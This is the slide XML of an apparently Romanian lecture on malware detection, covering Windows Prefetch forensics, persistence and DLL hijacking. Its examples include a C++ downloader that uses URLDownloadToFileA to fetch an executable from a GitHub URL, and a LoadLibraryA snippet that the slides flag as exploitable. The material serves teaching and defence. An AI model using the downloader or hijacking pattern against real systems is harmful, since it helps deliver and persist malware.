                <a:solidFill>
                  <a:schemeClr val="tx1">
                    <a:lumMod val="65000"/>
                    <a:lumOff val="35000"/>
                  </a:schemeClr>
                </a:solidFill>
              </a:rPr>
              <a:t>dăunător</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx1">
                    <a:lumMod val="65000"/>
                    <a:lumOff val="35000"/>
                  </a:schemeClr>
                </a:solidFill>
              </a:rPr>
              <a:t>.</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="4" name="Flowchart: Process 3"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="406835" y="1369787"/>
            <a:ext cx="11393279" cy="510358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164187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835" y="0"/>
            <a:ext cx="10838329" cy="6858000"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
      </p:pic>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="Flowchart: Process 2"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="774192" y="2930651"/>
            <a:ext cx="3029712" cy="97688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234167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9431"/>
            <a:ext cx="12192000" cy="4439138"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
      </p:pic>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="3461663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000" y="0"/>
            <a:ext cx="10530000" cy="6858000"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
      </p:pic>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="1324664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9322"/>
            <a:ext cx="12192000" cy="5899355"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
      </p:pic>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="2529196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42180"/>
            <a:ext cx="12192000" cy="1973640"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
      </p:pic>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="Flowchart: Process 2">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{7D77B233-2B30-7B5D-8B9E-8ADF4BFB5B8A}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="90684" y="1908629"/>
            <a:ext cx="12008113" cy="2738941"/>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4" name="Flowchart: Process 3">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{994607D3-9375-0A8C-A26E-10D786011774}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="200262" y="3075709"/>
            <a:ext cx="3313756" cy="755703"/>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pic>
        <p:nvPicPr>
          <p:cNvPr id="5" name="Picture 4">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{254901B7-F774-3FDB-2CF6-4123B00A1109}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvPicPr>
            <a:picLocks noChangeAspect="1"/>
          </p:cNvPicPr>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId3"/>
          <a:stretch>
            <a:fillRect/>
          </a:stretch>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="5346921" y="5504275"/>
            <a:ext cx="1495637" cy="512394"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
      </p:pic>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="1999723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F8EF2551-0332-FB89-E1B9-63B07A6720FE}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="566777" y="563478"/>
            <a:ext cx="5788682" cy="394806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907" y="103909"/>
            <a:ext cx="5038017" cy="6650182"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
      </p:pic>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="4" name="TextBox 3">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{D2FD7595-F26B-5834-3A7F-F3407FF06451}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1126624" y="1106350"/>
            <a:ext cx="4551849" cy="2862322"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="285750" indent="-285750">
              <a:buFont typeface="Wingdings" panose="05000000000000000000" pitchFamily="2" charset="2"/>
              <a:buChar char="Ø"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US">
                <a:solidFill>
                  <a:schemeClr val="tx1">
                    <a:lumMod val="75000"/>
                    <a:lumOff val="25000"/>
                  </a:schemeClr>
                </a:solidFill>
              </a:rPr>
              <a:t>Fișierele .pf din Prefetch (Prefetcher) sunt utilizate de sistemul de operare Windows pentru a accelera încărcarea aplicațiilor și pentru a îmbunătăți performanța generală a sistemului. </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="285750" indent="-285750">
              <a:buFont typeface="Wingdings" panose="05000000000000000000" pitchFamily="2" charset="2"/>
              <a:buChar char="Ø"/>
            </a:pPr>
            <a:endParaRPr lang="en-US">
              <a:solidFill>
                <a:schemeClr val="tx1">
                  <a:lumMod val="75000"/>
                  <a:lumOff val="25000"/>
                </a:schemeClr>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="285750" indent="-285750">
              <a:buFont typeface="Wingdings" panose="05000000000000000000" pitchFamily="2" charset="2"/>
              <a:buChar char="Ø"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US">
                <a:solidFill>
                  <a:schemeClr val="tx1">
                    <a:lumMod val="75000"/>
                    <a:lumOff val="25000"/>
                  </a:schemeClr>
                </a:solidFill>
              </a:rPr>
              <a:t>Aceste fișiere conțin informații despre executabilele pe care le lansează utilizatorul și includ detalii precum resursele pe care le accesează și ordinea în care sunt încărcate.</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="6" name="Picture 5">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{F918D134-111D-5636-871D-3D7F7D0C7A04}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvPicPr>
            <a:picLocks noChangeAspect="1"/>
          </p:cNvPicPr>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId3"/>
          <a:stretch>
            <a:fillRect/>
          </a:stretch>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="2671736" y="5389975"/>
            <a:ext cx="1495637" cy="512394"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
      </p:pic>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="2304637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B1BADB66-4942-2744-5A11-57FD8109783B}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="457200" y="1908629"/>
            <a:ext cx="11284857" cy="483325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Prefetch</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="Content Placeholder 2"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="581192" y="2075300"/>
            <a:ext cx="10436058" cy="4499914"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr>
            <a:normAutofit lnSpcReduction="10000"/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US"/>
              <a:t>Pentru detecția malware, extragerea și analiza acestor fișiere pot fi utile din mai multe motive:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" b="1"/>
              <a:t>Istoricul activităților</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US"/>
              <a:t>. Fișierele Prefetch oferă o evidență a aplicațiilor executate pe sistem, inclusiv data și ora primei și ultimei execuții. Acest lucru poate ajuta la identificarea activităților suspecte sau neobișnuite.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" b="1"/>
              <a:t>Ordinea de încărcare a modulelor</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US"/>
              <a:t>. Deoarece fișierele .pf conțin informații despre resursele utilizate și ordinea de încărcare, ele pot dezvălui module sau biblioteci neobișnuite care sunt încărcate de un executabil, ceea ce ar putea sugera prezența unui malware.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" b="1"/>
              <a:t>Prezența executabilelor necunoscute</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US"/>
              <a:t>. Analiza fișierelor .pf poate dezvălui executabile necunoscute sau neautorizate care au fost lansate pe sistem, indicând o posibilă compromitere.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" b="1"/>
              <a:t>Comportament anormal</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US"/>
              <a:t>. Dacă un fișier .pf arată activitate frecventă în afara orelor obișnuite sau în timpul în care utilizatorul nu ar trebui să fie activ, acesta ar putea indica un comportament malițios.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" b="1"/>
              <a:t>Corelare cu alte artefacte</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US"/>
              <a:t>. Fișierele .pf pot fi corelate cu alte artefacte digitale pentru a obține o imagine mai completă a comportamentului sistemului și a detecta potențiale anomalii.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US"/>
              <a:t>Astfel, analiza fișierelor .pf din Prefetch poate fi un instrument valoros în detectarea și investigarea activităților malware, ajutând la identificarea tiparelor suspecte și a executabilelor neautorizate.</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="1835813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525"/>
            <a:ext cx="12192000" cy="4022949"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
      </p:pic>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="Flowchart: Process 2">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{DFA41480-4CC9-C66B-1D52-8413D854197F}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="113506" y="3083266"/>
            <a:ext cx="1737966" cy="816159"/>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177326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3145"/>
            <a:ext cx="12192000" cy="3311710"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
      </p:pic>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="2" name="Flowchart: Process 1">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{6A4762CE-6454-024F-12B5-7B10AB21A977}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="113506" y="2992583"/>
            <a:ext cx="5327552" cy="8841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331453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458" y="0"/>
            <a:ext cx="11081084" cy="6858000"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
      </p:pic>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="Flowchart: Process 2">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{FDEA64A0-C74D-53DC-FD5D-EBC1C54C1DA6}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="634790" y="2773428"/>
            <a:ext cx="5010308" cy="131492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250134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145"/>
            <a:ext cx="12192000" cy="6727710"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
      </p:pic>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="Flowchart: Process 2">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{4850C341-A7ED-C7BC-38FB-4ECA7053881C}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="143582" y="2856555"/>
            <a:ext cx="3483789" cy="1133553"/>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68345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a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" u="sng"/>
              <a:t>C.14.3</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en-US"/>
            </a:br>
            <a:r>
              <a:rPr lang="en-US"/>
              <a:t>DLL Hijacking</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075666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DLL hai jaking</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="6" name="Rectangle 5"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="538520" y="2512824"/>
            <a:ext cx="6118353" cy="3714863"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr>
              <a:lnSpc>
                <a:spcPct val="107000"/>
              </a:lnSpc>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="10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&lt;iostream&gt;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&lt;urlmon.h&gt;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#pragma comment(lib, "urlmon.lib")</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main</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URL-ul fișierului care va fi descărcat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const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url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u="sng">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https://github.com/Gagniuc/ATM/raw/main/t.exe</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Calea locală unde va fi salvat fișierul descărcat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const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filePath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"t.exe"</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Descărcare folosind URLDownloadToFileA</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HRESULT hr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URLDownloadToFileA</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url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filePath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SUCCEEDED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cout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"Fișier descărcat "</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filePath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endl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else</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cerr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"Eroare la descărcare: "</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hr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endl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7447510" y="1346624"/>
            <a:ext cx="4246419" cy="369332"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="none">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US">
                <a:solidFill>
                  <a:prstClr val="white"/>
                </a:solidFill>
              </a:rPr>
              <a:t>g++ -o descarcare_fisier.exe d.cpp -lurlmon</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09868" y="2314149"/>
            <a:ext cx="5031288" cy="4034435"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:ln>
            <a:noFill/>
          </a:ln>
          <a:effectLst>
            <a:outerShdw blurRad="190500" algn="tl" rotWithShape="0">
              <a:srgbClr val="000000">
                <a:alpha val="70000"/>
              </a:srgbClr>
            </a:outerShdw>
          </a:effectLst>
        </p:spPr>
      </p:pic>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="10" name="Flowchart: Process 9"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7519240" y="3370434"/>
            <a:ext cx="3869017" cy="144339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3" name="Rectangle 2">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{F2B01D8C-6A10-99C6-8419-90757D9AC9CA}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6138545" y="2069244"/>
            <a:ext cx="86005" cy="4525294"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="3D614E">
              <a:alpha val="52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261021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persistenta</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1193" y="2089429"/>
            <a:ext cx="6968276" cy="4477626"/>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61D1A190-211C-39DC-3897-45A5D829253F}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvPicPr>
            <a:picLocks noChangeAspect="1"/>
          </p:cNvPicPr>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId3"/>
          <a:stretch>
            <a:fillRect/>
          </a:stretch>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="1727000" y="3859399"/>
            <a:ext cx="7793573" cy="823601"/>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6" name="Arrow: Bent 5">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{CF839D09-4301-109E-FA4D-86EE9BB03730}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1209124" y="3615996"/>
            <a:ext cx="1586975" cy="2354053"/>
          </a:xfrm>
          <a:prstGeom prst="bentArrow">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="3666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75827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55676"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persistenta</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7531" y="2387444"/>
            <a:ext cx="4520457" cy="3624815"/>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7299" y="2657149"/>
            <a:ext cx="5257170" cy="3045632"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:ln>
            <a:noFill/>
          </a:ln>
          <a:effectLst>
            <a:outerShdw blurRad="190500" algn="tl" rotWithShape="0">
              <a:srgbClr val="000000">
                <a:alpha val="70000"/>
              </a:srgbClr>
            </a:outerShdw>
          </a:effectLst>
        </p:spPr>
      </p:pic>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="Rectangle 2">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{DE57894F-2C5D-45F6-A7E5-B4FEB2524340}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5684641" y="2069244"/>
            <a:ext cx="86005" cy="4525294"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="3D614E">
              <a:alpha val="71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5301870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persistenta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4991" y="4488837"/>
            <a:ext cx="8124147" cy="1850853"/>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424" y="2189873"/>
            <a:ext cx="3995398" cy="2848790"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:ln>
            <a:noFill/>
          </a:ln>
          <a:effectLst>
            <a:outerShdw blurRad="190500" algn="tl" rotWithShape="0">
              <a:srgbClr val="000000">
                <a:alpha val="70000"/>
              </a:srgbClr>
            </a:outerShdw>
          </a:effectLst>
        </p:spPr>
      </p:pic>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="8" name="Flowchart: Process 7"/>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723571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Incarcare directa</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="4" name="Rectangle 3"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="792480" y="2080482"/>
            <a:ext cx="6096000" cy="4208844"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
        <p:txBody>
          <a:bodyPr>
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr>
              <a:lnSpc>
                <a:spcPct val="107000"/>
              </a:lnSpc>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="10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&lt;Windows.h&gt;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&lt;stdio.h&gt;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LoadCustomDLL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const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dll_path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Încărcare DLL specificat de utilizator</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HMODULE hModule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LoadLibraryA</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dll_path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hModule</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printf</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"DLL a fost încărcat cu succes: %s\n"</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dll_path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Opriți și eliberați biblioteca</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FreeLibrary</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hModule</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else</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printf</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"Nu s-a putut încărca DLL: %s\n"</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dll_path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main</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Calea către fișierul DLL care trebuie încărcat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const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dll_path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"C:\\Path\\to\\your\\DLL.dll"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LoadCustomDLL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dll_path</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174089" y="2311414"/>
            <a:ext cx="5373045" cy="3970318"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="285750" indent="-285750">
              <a:buFont typeface="Wingdings" panose="05000000000000000000" pitchFamily="2" charset="2"/>
              <a:buChar char="Ø"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US">
                <a:solidFill>
                  <a:schemeClr val="tx1">
                    <a:lumMod val="65000"/>
                    <a:lumOff val="35000"/>
                  </a:schemeClr>
                </a:solidFill>
              </a:rPr>
              <a:t>Acest exemplu simplu demonstrează încărcarea unui DLL specificat de utilizator utilizând LoadLibraryA. </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="285750" indent="-285750">
              <a:buFont typeface="Wingdings" panose="05000000000000000000" pitchFamily="2" charset="2"/>
              <a:buChar char="Ø"/>
            </a:pPr>
            <a:endParaRPr lang="en-US">
              <a:solidFill>
                <a:schemeClr val="tx1">
                  <a:lumMod val="65000"/>
                  <a:lumOff val="35000"/>
                </a:schemeClr>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="285750" indent="-285750">
              <a:buFont typeface="Wingdings" panose="05000000000000000000" pitchFamily="2" charset="2"/>
              <a:buChar char="Ø"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US">
                <a:solidFill>
                  <a:schemeClr val="tx1">
                    <a:lumMod val="65000"/>
                    <a:lumOff val="35000"/>
                  </a:schemeClr>
                </a:solidFill>
              </a:rPr>
              <a:t>Dacă încărcarea reușește, funcția FreeLibrary este folosită pentru a elibera resursele. </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="285750" indent="-285750">
              <a:buFont typeface="Wingdings" panose="05000000000000000000" pitchFamily="2" charset="2"/>
              <a:buChar char="Ø"/>
            </a:pPr>
            <a:endParaRPr lang="en-US">
              <a:solidFill>
                <a:schemeClr val="tx1">
                  <a:lumMod val="65000"/>
                  <a:lumOff val="35000"/>
                </a:schemeClr>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="285750" indent="-285750">
              <a:buFont typeface="Wingdings" panose="05000000000000000000" pitchFamily="2" charset="2"/>
              <a:buChar char="Ø"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US">
                <a:solidFill>
                  <a:schemeClr val="tx1">
                    <a:lumMod val="65000"/>
                    <a:lumOff val="35000"/>
                  </a:schemeClr>
                </a:solidFill>
              </a:rPr>
              <a:t>Dacă încărcarea nu reușește, se afișează un mesaj de eroare. </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="285750" indent="-285750">
              <a:buFont typeface="Wingdings" panose="05000000000000000000" pitchFamily="2" charset="2"/>
              <a:buChar char="Ø"/>
            </a:pPr>
            <a:endParaRPr lang="en-US">
              <a:solidFill>
                <a:schemeClr val="tx1">
                  <a:lumMod val="65000"/>
                  <a:lumOff val="35000"/>
                </a:schemeClr>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="285750" indent="-285750">
              <a:buFont typeface="Wingdings" panose="05000000000000000000" pitchFamily="2" charset="2"/>
              <a:buChar char="Ø"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US">
                <a:solidFill>
                  <a:schemeClr val="tx1">
                    <a:lumMod val="65000"/>
                    <a:lumOff val="35000"/>
                  </a:schemeClr>
                </a:solidFill>
              </a:rPr>
              <a:t>Acest tip de cod este util pentru încărcarea dinamică a bibliotecilor, dar poate fi exploatat în atacurile de tip DLL-hijacking, de aceea este important să se asigure validitatea și integritatea cailor de fișiere DLL utilizate în aplicații.</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="Rectangle 2">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{57E6FAD5-BF3C-3850-3F59-F766E75231AD}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5987243" y="2069244"/>
            <a:ext cx="86005" cy="4525294"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="3D614E">
              <a:alpha val="58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893689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Informatii suplimentare</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="Content Placeholder 2"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="581192" y="2180497"/>
            <a:ext cx="11029615" cy="574896"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US">
                <a:hlinkClick r:id="rId2"/>
              </a:rPr>
              <a:t>https://attack.mitre.org/techniques/T1574/001/</a:t>
            </a:r>
            <a:endParaRPr lang="en-US"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="4" name="Picture 3"/>
          <p:cNvPicPr>
            <a:picLocks noChangeAspect="1"/>
          </p:cNvPicPr>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId3"/>
